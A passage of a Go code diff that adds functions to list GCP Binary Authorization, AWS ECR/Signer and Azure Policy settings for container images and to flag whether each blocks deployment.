+			details += fmt.Sprintf(", %d cluster-specific rules", len(policy.ClusterAdmissionRules))
+		}
+		if len(exemptImages) > 0 {
+			details += fmt.Sprintf(", %d exempt patterns", len(exemptImages))
+		}
+
+		policies = append(policies, CloudImagePolicy{
+			Provider:         "gcp",
+			PolicyType:       "binary-authorization",
+			Name:             "Project Policy",
+			Scope:            "project",
+			ScopeID:          project,
+			EnforcementMode:  enforcementMode,
+			DefaultAction:    defaultAction,
+			BlocksDeployment: blocksDeployment,
+			Details:          details,
+			AttestorsCount:   attestorsCount,
+			ExemptImages:     exemptImages,
+		})
+
+		// Get cluster-specific rules
+		for clusterName, rule := range policy.ClusterAdmissionRules {
+			// Check if cluster rule blocks deployment
+			clusterBlocks := false
+			if strings.Contains(rule.EnforcementMode, "ENFORCED") &&
+				(rule.EvaluationMode == "ALWAYS_DENY" || rule.EvaluationMode == "REQUIRE_ATTESTATION") {
+				clusterBlocks = true
+			}
+
+			policies = append(policies, CloudImagePolicy{
+				Provider:         "gcp",
+				PolicyType:       "binary-authorization-cluster",
+				Name:             clusterName,
+				Scope:            "cluster",
+				ScopeID:          project,
+				EnforcementMode:  rule.EnforcementMode,
+				DefaultAction:    rule.EvaluationMode,
+				BlocksDeployment: clusterBlocks,
+				Details:          fmt.Sprintf("Cluster: %s, Attestors: %d", clusterName, len(rule.RequireAttestationsBy)),
+				AttestorsCount:   len(rule.RequireAttestationsBy),
+			})
+		}
+
+		// List attestors
+		attestorList, err := clients.GCPBinaryAuthService.Projects.Attestors.List(fmt.Sprintf("projects/%s", project)).Context(ctx).Do()
+		if err == nil {
+			for _, att := range attestorList.Attestors {
+				keyCount := 0
+				keyAlg := ""
+				if att.UserOwnedGrafeasNote != nil && att.UserOwnedGrafeasNote.PublicKeys != nil {
+					keyCount = len(att.UserOwnedGrafeasNote.PublicKeys)
+					if keyCount > 0 {
+						keyAlg = att.UserOwnedGrafeasNote.PublicKeys[0].PkixPublicKey.SignatureAlgorithm
+					}
+				}
+
+				attestors = append(attestors, GCPBinaryAuthAttestor{
+					Name:         att.Name,
+					Project:      project,
+					Description:  att.Description,
+					KeyCount:     keyCount,
+					KeyAlgorithm: keyAlg,
+					UpdateTime:   att.UpdateTime,
+				})
+			}
+		}
+	}
+
+	return policies, attestors
+}
+
+// analyzeAWSImagePolicies fetches AWS ECR and Signer policies from the API
+func analyzeAWSImagePolicies(ctx context.Context, clients *ImageAdmissionCloudClients, logger internal.Logger) ([]CloudImagePolicy, []AWSECRScanConfig, []AWSSignerProfile) {
+	var policies []CloudImagePolicy
+	var scanConfigs []AWSECRScanConfig
+	var signerProfiles []AWSSignerProfile
+
+	if clients == nil || clients.AWSECRClient == nil {
+		return policies, scanConfigs, signerProfiles
+	}
+
+	// Get ECR registry scanning configuration
+	// NOTE: ECR scanning detects malicious images but does NOT block deployment
+	scanConfigOutput, err := clients.AWSECRClient.GetRegistryScanningConfiguration(ctx, &ecr.GetRegistryScanningConfigurationInput{})
+	if err == nil && scanConfigOutput.ScanningConfiguration != nil {
+		scanType := string(scanConfigOutput.ScanningConfiguration.ScanType)
+
+		details := fmt.Sprintf("Scan Type: %s (detects malicious, does NOT block)", scanType)
+		if scanConfigOutput.ScanningConfiguration.Rules != nil {
+			details += fmt.Sprintf(", %d rules", len(scanConfigOutput.ScanningConfiguration.Rules))
+		}
+
+		policies = append(policies, CloudImagePolicy{
+			Provider:         "aws",
+			PolicyType:       "ecr-registry-scanning",
+			Name:             "Registry Scanning Configuration",
+			Scope:            "registry",
+			ScopeID:          clients.AWSRegion,
+			EnforcementMode:  scanType,
+			DefaultAction:    "scan-only",
+			BlocksDeployment: false, // ECR scanning does NOT block deployment
+			Details:          details,
+		})
+
+		// Add scanning rules as individual policies
+		for _, rule := range scanConfigOutput.ScanningConfiguration.Rules {
+			filters := []string{}
+			for _, f := range rule.RepositoryFilters {
+				filters = append(filters, *f.Filter)
+			}
+
+			policies = append(policies, CloudImagePolicy{
+				Provider:         "aws",
+				PolicyType:       "ecr-scan-rule",
+				Name:             fmt.Sprintf("Scan Rule (%s)", string(rule.ScanFrequency)),
+				Scope:            "repository-filter",
+				ScopeID:          clients.AWSRegion,
+				EnforcementMode:  string(rule.ScanFrequency),
+				DefaultAction:    "scan-only",
+				BlocksDeployment: false, // Scanning rules don't block
+				Details:          fmt.Sprintf("Filters: %s (detects malicious post-push)", strings.Join(filters, ", ")),
+			})
+		}
+	}
+
+	// List repositories and their scan configurations
+	reposOutput, err := clients.AWSECRClient.DescribeRepositories(ctx, &ecr.DescribeRepositoriesInput{})
+	if err == nil {
+		for _, repo := range reposOutput.Repositories {
+			scanOnPush := false
+			if repo.ImageScanningConfiguration != nil {
+				scanOnPush = repo.ImageScanningConfiguration.ScanOnPush
+			}
+
+			scanConfigs = append(scanConfigs, AWSECRScanConfig{
+				RepositoryName: *repo.RepositoryName,
+				RegistryID:     *repo.RegistryId,
+				ScanOnPush:     scanOnPush,
+				ScanFrequency:  "SCAN_ON_PUSH",
+			})
+		}
+	}
+
+	// List Signer signing profiles
+	// NOTE: Signer profiles only block deployment if an admission controller enforces signature verification
+	if clients.AWSSignerClient != nil {
+		profilesOutput, err := clients.AWSSignerClient.ListSigningProfiles(ctx, &signer.ListSigningProfilesInput{})
+		if err == nil {
+			for _, profile := range profilesOutput.Profiles {
+				profileName := ""
+				if profile.ProfileName != nil {
+					profileName = *profile.ProfileName
+				}
+
+				signerProfiles = append(signerProfiles, AWSSignerProfile{
+					ProfileName:    profileName,
+					ProfileVersion: *profile.ProfileVersion,
+					PlatformID:     *profile.PlatformId,
+					Status:         string(profile.Status),
+					Tags:           profile.Tags,
+				})
+
+				// Add as policy
+				policies = append(policies, CloudImagePolicy{
+					Provider:         "aws",
+					PolicyType:       "signer-profile",
+					Name:             profileName,
+					Scope:            "account",
+					ScopeID:          clients.AWSRegion,
+					EnforcementMode:  string(profile.Status),
+					DefaultAction:    "sign",
+					BlocksDeployment: false, // Requires admission controller to enforce
+					Details:          fmt.Sprintf("Platform: %s, Version: %s (requires admission controller to enforce)", *profile.PlatformId, *profile.ProfileVersion),
+				})
+			}
+		}
+	}
+
+	return policies, scanConfigs, signerProfiles
+}
+
+// analyzeAzureImagePolicies fetches Azure Policy assignments related to container images
+func analyzeAzureImagePolicies(ctx context.Context, clients *ImageAdmissionCloudClients, logger internal.Logger) ([]CloudImagePolicy, []AzureImagePolicy) {
+	var policies []CloudImagePolicy
+	var azurePolicies []AzureImagePolicy
+
+	if clients == nil || clients.AzureCredential == nil {
+		return policies, azurePolicies
+	}
+
+	subscriptions := clients.AzureSubscriptions
+	if len(subscriptions) == 0 {
+		logger.InfoM("No Azure subscriptions specified, skipping Policy enumeration", K8S_IMAGE_ADMISSION_MODULE_NAME)
+		return policies, azurePolicies
+	}
+
+	// Container/AKS related policy definition IDs (built-in Azure policies)
+	containerPolicyPatterns := []string{
+		"container",
+		"kubernetes",
+		"aks",
+		"registry",
+		"acr",
+		"image",
+	}
+
+	for _, subID := range subscriptions {
+		// Create policy assignments client
+		assignmentsClient, err := armpolicy.NewAssignmentsClient(subID, clients.AzureCredential, nil)
+		if err != nil {
+			logger.InfoM(fmt.Sprintf("Failed to create policy client for subscription %s: %v", subID, err), K8S_IMAGE_ADMISSION_MODULE_NAME)
+			continue
+		}
+
+		// List all policy assignments
+		pager := assignmentsClient.NewListPager(nil)
+		for pager.More() {
+			page, err := pager.NextPage(ctx)
+			if err != nil {
+				break
+			}
+
+			for _, assignment := range page.Value {
+				// Filter for container/AKS related policies
+				policyName := ""
+				if assignment.Properties != nil && assignment.Properties.DisplayName != nil {
+					policyName = *assignment.Properties.DisplayName
+				}
+				if policyName == "" && assignment.Name != nil {
+					policyName = *assignment.Name
+				}
+
+				// Check if policy is container-related
+				isContainerPolicy := false
+				policyNameLower := strings.ToLower(policyName)
+				for _, pattern := range containerPolicyPatterns {
+					if strings.Contains(policyNameLower, pattern) {
+						isContainerPolicy = true
+						break
+					}
+				}
+
+				if !isContainerPolicy {
+					continue
+				}
+
+				enforcementMode := "Default"
+				if assignment.Properties != nil && assignment.Properties.EnforcementMode != nil {
+					enforcementMode = string(*assignment.Properties.EnforcementMode)
+				}
+
+				scope := ""
+				if assignment.Properties != nil && assignment.Properties.Scope != nil {
+					scope = *assignment.Properties.Scope
+				}
+
+				// Extract allowed registries from parameters if present
+				var allowedRegistries []string
+				var effect string
+				if assignment.Properties != nil && assignment.Properties.Parameters != nil {
+					params := assignment.Properties.Parameters
+					// Check for common parameter names for allowed registries
+					for paramName, paramValue := range params {
+						paramNameLower := strings.ToLower(paramName)
+						if strings.Contains(paramNameLower, "allowedregist") ||
+							strings.Contains(paramNameLower, "allowedcontainerimageregex") ||
+							strings.Contains(paramNameLower, "registries") {
+							if paramValue.Value != nil {
+								// Try to extract string or array value
+								switch v := paramValue.Value.(type) {
+								case string:
+									allowedRegistries = append(allowedRegistries, v)
+								case []interface{}:
+									for _, item := range v {
+										if str, ok := item.(string); ok {
+											allowedRegistries = append(allowedRegistries, str)
+										}
+									}
+								}
+							}
+						}
+						if strings.ToLower(paramName) == "effect" {
+							if paramValue.Value != nil {
+								if str, ok := paramValue.Value.(string); ok {
+									effect = str
+								}
+							}
+						}
+					}
+				}
+
+				// Determine if this policy blocks deployment
+				blocksDeployment := false
+				if enforcementMode == "Default" && (effect == "Deny" || effect == "deny") {
+					blocksDeployment = true
+				}
+
+				azPolicy := AzureImagePolicy{
+					PolicyName:        policyName,
+					DisplayName:       policyName,
+					PolicyType:        "Assignment",
+					Scope:             scope,
+					EnforcementMode:   enforcementMode,
+					Effect:            effect,
+					BlocksDeployment:  blocksDeployment,
+					AllowedRegistries: allowedRegistries,
+				}
+
+				if assignment.Name != nil {
+					azPolicy.AssignmentName = *assignment.Name
+				}
+
+				azurePolicies = append(azurePolicies, azPolicy)
+
+				// Build details string
+				details := fmt.Sprintf("Scope: %s", scope)
+				if effect != "" {
+					details += fmt.Sprintf(", Effect: %s", effect)
+				}
+
+				policies = append(policies, CloudImagePolicy{
+					Provider:          "azure",
+					PolicyType:        "azure-policy",
+					Name:              policyName,
+					Scope:             "subscription",
+					ScopeID:           subID,
+					EnforcementMode:   enforcementMode,
+					DefaultAction:     effect,
+					BlocksDeployment:  blocksDeployment,
+					AllowedRegistries: allowedRegistries,
+					Details:           details,
+				})
+			}
+		}
+	}
+
+	return policies, azurePolicies
 }
